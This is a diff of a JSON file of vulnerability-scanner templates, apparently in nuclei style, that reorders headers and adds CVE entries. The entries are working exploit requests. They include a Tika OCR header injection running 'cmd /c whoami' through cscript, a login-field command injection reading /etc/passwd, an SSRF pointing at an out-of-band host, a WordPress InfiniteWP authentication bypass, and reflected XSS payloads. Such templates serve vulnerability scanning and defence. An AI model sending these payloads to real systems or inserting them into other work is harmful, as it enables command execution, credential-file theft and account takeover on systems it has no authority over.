@@ -6462,11 +6462,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
+            "Content-type": "image/jp2",
+            "Connection": "close",
             "X-Tika-OCRTesseractPath": "cscript",
             "X-Tika-OCRLanguage": "//E:Jscript",
-            "Expect": "100-continue",
-            "Content-type": "image/jp2",
-            "Connection": "close"
+            "Expect": "100-continue"
           },
           "method": "PUT",
           "path": [
@@ -9890,8 +9890,8 @@
         {
           "body": "url=https://{{Host}}:443@{{interactsh-url}}\n",
           "headers": {
-            "X-Atlassian-Token": "no-check",
-            "Content-Type": "application/x-www-form-urlencoded"
+            "Content-Type": "application/x-www-form-urlencoded",
+            "X-Atlassian-Token": "no-check"
           },
           "method": "POST",
           "path": [
@@ -11272,8 +11272,8 @@
         {
           "body": "op=login&username=;`cat /etc/passwd`&password=\n",
           "headers": {
-            "Referer": "{{Hostname}}/module/login/login.html",
-            "Content-Type": "application/x-www-form-urlencoded"
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Referer": "{{Hostname}}/module/login/login.html"
           },
           "method": "POST",
           "path": [
@@ -13022,6 +13022,21 @@
           "raw": [
             "POST / HTTP/1.1\nHost: {{Hostname}}\nConnection: close\nAccept: */*\n\nIWP_JSON_PREFIX\n",
             "GET /wp-admin/index.php HTTP/1.1\nHost: {{Hostname}}\nConnection: close\nAccept: */*\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2020-8772",
+      "info": {
+        "name": "WordPress InfiniteWP Client < 1.9.4.5 - Authentication Bypass",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "GET /?author=1 HTTP/1.1\nHost: {{Hostname}}\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nAccept-Language: en-US,en;q=0.9\n",
+            "POST / HTTP/1.1\nHost: {{Hostname}}\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nContent-Type: application/x-www-form-urlencoded\n\n_IWP_JSON_PREFIX_{{base64(\"{\\\"iwp_action\\\":\\\"add_site\\\",\\\"params\\\":{\\\"username\\\":\\\"{{username}}\\\"}}\")}}\n"
           ]
         }
       ]
@@ -17873,6 +17888,21 @@
       ]
     },
     {
+      "id": "CVE-2021-45422",
+      "info": {
+        "name": "Reprise License Manager 14.2 - Reflected XSS",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/goform/activate_process?isv=&akey=&hostid=&count=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-45428",
       "info": {
         "name": "Telesquare TLR-2005KSH 1.0.0 - Arbitrary File Upload",
@@ -20129,6 +20159,36 @@
         {
           "raw": [
             "GET /wnm/login/login.json HTTP/1.1\nHost: {{Hostname}}\nCookie: svpnlang=<script>alert('document.domain')</script>\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-35493",
+      "info": {
+        "name": "eShop - Cross-site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/home/get_products?search=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-36883",
+      "info": {
+        "name": "Git Plugin up to 4.11.3 on Jenkins Build Authorization",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/git/notifyCommit?url={{randstr}}&branches={{randstr}}"
           ]
         }
       ]
